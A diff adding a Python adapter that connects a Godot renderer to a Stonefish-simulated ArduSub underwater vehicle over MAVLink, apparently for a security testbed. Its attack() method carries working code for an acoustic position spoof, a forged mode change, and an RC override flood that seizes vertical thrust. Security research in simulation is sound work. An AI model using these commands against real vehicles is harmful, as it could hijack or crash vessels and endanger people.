@@ -1,0 +1,197 @@
+#!/usr/bin/env python3
+"""
+Stonefish telemetry source for the Godot front-end.
+
+This is the "both softwares combined" path: Stonefish owns the high-fidelity
+physics (it is the JSON FDM backing ArduSub; see tools/stonefish_bridge.sh), and
+Godot renders that same vehicle state with game-quality visuals. This adapter
+exposes the exact attribute/method surface that tools/godot_relay.py reads from
+nodes/app/mcr_app.Backend, but instead of booting a Gazebo world it attaches to
+the already-running Stonefish-bridged ArduSub over MAVLink and drives the
+acoustic (USBL/ExternalNav) spoof through the extnav injector.
+
+Pre-req: `tools/stonefish_bridge.sh up` is already running.
+"""
+import math
+import os
+import socket
+import threading
+import time
+
+from pymavlink import mavutil
+
+# ArduSub in the Stonefish stack: SERIAL2 TCP (free; 5760=mav_bridge, 5762=extnav)
+MAVLINK = os.environ.get("MCR_STONEFISH_MAVLINK", "tcp:127.0.0.1:5763")
+EXTNAV_CTRL = ("127.0.0.1", 10120)   # stonefish_extnav.py spoof toggle
+POSE_PORT = 9005                     # MCR true-pose broadcast (shared w/ extnav)
+
+
+class StonefishSource:
+    def __init__(self):
+        self.site = "kochi"
+        self.twin = "auv150"
+        self.domain = "underwater"          # the Stonefish twin is a submerged AUV
+        self.home = (9.9, 76.2)
+        self.lock = threading.Lock()
+        self.state = dict(lat=None, lon=None, hdg=0.0, depth=0.0, speed=0.0,
+                          armed=False, mode="--", hb=0)
+        self.events = []
+        self.booting = False
+        self.connected = False
+        self.active_attack = None
+        self.conn = None
+        self._stop = False
+        self._spoof = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    # ---- helpers -------------------------------------------------------
+    def log(self, m):
+        self.events.append((time.strftime("%H:%M:%S"), m))
+        self.events[:] = self.events[-40:]
+
+    def _spoof_cmd(self, cmd):
+        try:
+            self._spoof.sendto(cmd.encode(), EXTNAV_CTRL)
+        except OSError:
+            pass
+
+    # ---- lifecycle -----------------------------------------------------
+    def boot(self, site, twin, domain):
+        """Attach to the running Stonefish stack (does NOT boot Gazebo)."""
+        self.site = site or "kochi"
+        self.twin = twin or "auv150"
+        self.domain = "underwater"
+        self.booting = True
+        self.log(f"attaching to Stonefish stack ({MAVLINK}) ...")
+        self.conn = mavutil.mavlink_connection(MAVLINK, source_system=255)
+        if self.conn.wait_heartbeat(timeout=20) is None:
+            self.booting = False
+            self.log("no ArduSub heartbeat -- is tools/stonefish_bridge.sh up?")
+            return False
+        self.conn.mav.request_data_stream_send(
+            self.conn.target_system, self.conn.target_component,
+            mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)
+        self.booting = False
+        self.connected = True
+        self.log("connected -- Godot now rendering Stonefish physics")
+        threading.Thread(target=self._rx_loop, daemon=True).start()
+        return True
+
+    def _rx_loop(self):
+        mm = self.conn.mode_mapping() or {}
+        inv = {v: k for k, v in mm.items()}
+        while not self._stop and self.conn:
+            msg = self.conn.recv_match(
+                type=["GLOBAL_POSITION_INT", "VFR_HUD", "HEARTBEAT"],
+                blocking=True, timeout=1.0)
+            if msg is None:
+                continue
+            t = msg.get_type()
+            with self.lock:
+                if t == "GLOBAL_POSITION_INT":
+                    self.state["lat"] = msg.lat / 1e7
+                    self.state["lon"] = msg.lon / 1e7
+                    if msg.hdg != 65535:
+                        self.state["hdg"] = msg.hdg / 100.0
+                    self.state["depth"] = max(0.0, -msg.relative_alt / 1000.0)
+                elif t == "VFR_HUD":
+                    self.state["speed"] = msg.groundspeed
+                    self.state["depth"] = max(0.0, -msg.alt)
+                elif t == "HEARTBEAT":
+                    self.state["armed"] = bool(
+                        msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED)
+                    self.state["mode"] = inv.get(msg.custom_mode, str(msg.custom_mode))
+                    self.state["hb"] += 1
+
+    # ---- control -------------------------------------------------------
+    def _set_mode(self, name):
+        mm = self.conn.mode_mapping() or {}
+        if name in mm:
+            self.conn.mav.set_mode_send(
+                self.conn.target_system,
+                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm[name])
+
+    def arm(self):
+        if not self.conn:
+            return
+        self._set_mode("ALT_HOLD")
+        time.sleep(0.3)
+        self.conn.mav.command_long_send(
+            self.conn.target_system, self.conn.target_component,
+            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
+        self.log("arm (ALT_HOLD)")
+
+    def disarm(self):
+        if not self.conn:
+            return
+        self.conn.mav.command_long_send(
+            self.conn.target_system, self.conn.target_component,
+            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 0, 0, 0, 0, 0, 0, 0)
+        self.log("disarm")
+
+    def goto(self, lat, lon):
+        """GUIDED waypoint. ArduSub holds depth; horizontal nav to the target."""
+        if not self.conn:
+            return
+        self._set_mode("GUIDED")
+        time.sleep(0.3)
+        self.conn.mav.set_position_target_global_int_send(
+            0, self.conn.target_system, self.conn.target_component,
+            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
+            0b0000111111111000, int(lat * 1e7), int(lon * 1e7), -self.state["depth"],
+            0, 0, 0, 0, 0, 0, 0, 0)
+        self.log(f"goto {lat:.5f},{lon:.5f}")
+
+    def attack(self, name):
+        """Attack surface of the submerged Stonefish AUV. Accepts both the
+        Godot HUD labels ("Acoustic spoof", "C2 mode", "C2 override") and the
+        snake_case ids."""
+        self.active_attack = name
+        n = name.lower().replace(" ", "_")
+        c = self.conn
+        if n in ("acoustic_spoof", "usbl_spoof", "acoustic", "gps_spoof"):
+            # submerged: the position channel is acoustic/ExternalNav, not GPS
+            self._spoof_cmd("ramp")          # realistic gradual walk-off
+            self.log("ATTACK: acoustic/USBL ExternalNav spoof (ramp walk-off) ON")
+        elif n == "c2_mode" and c:
+            mm = c.mode_mapping() or {}
+            tgt = next((m for m in ("MANUAL", "HOLD", "ALT_HOLD") if m in mm), None)
+            if tgt:
+                c.mav.set_mode_send(c.target_system,
+                                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm[tgt])
+                self.log(f"ATTACK: forged SET_MODE -> {tgt}")
+        elif n == "c2_override" and c:
+            for _ in range(12):
+                c.mav.rc_channels_override_send(c.target_system, c.target_component,
+                                                65535, 65535, 1850, 65535, 65535, 65535, 65535, 65535)
+                time.sleep(0.04)
+            self.log("ATTACK: RC_CHANNELS_OVERRIDE -- vertical thrust seized")
+        else:
+            self.log(f"ATTACK: {name} not applicable to a submerged AUV")
+
+    def stop_attack(self):
+        name = self.active_attack
+        n = (name or "").lower().replace(" ", "_")
+        c = self.conn
+        if n in ("acoustic_spoof", "usbl_spoof", "acoustic", "gps_spoof"):
+            self._spoof_cmd("off")
+        elif n == "c2_override" and c:
+            c.mav.rc_channels_override_send(c.target_system, c.target_component,
+                                            0, 0, 0, 0, 0, 0, 0, 0)
+        elif n == "c2_mode" and c:
+            mm = c.mode_mapping() or {}
+            if "ALT_HOLD" in mm:
+                c.mav.set_mode_send(c.target_system,
+                                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm["ALT_HOLD"])
+        if name:
+            self.log(f"STOP: {name}")
+        self.active_attack = None
+
+    def teardown(self):
+        self._stop = True
+        try:
+            if self.conn:
+                self.conn.close()
+        except Exception:
+            pass
+        self.conn = None
+        self.connected = False
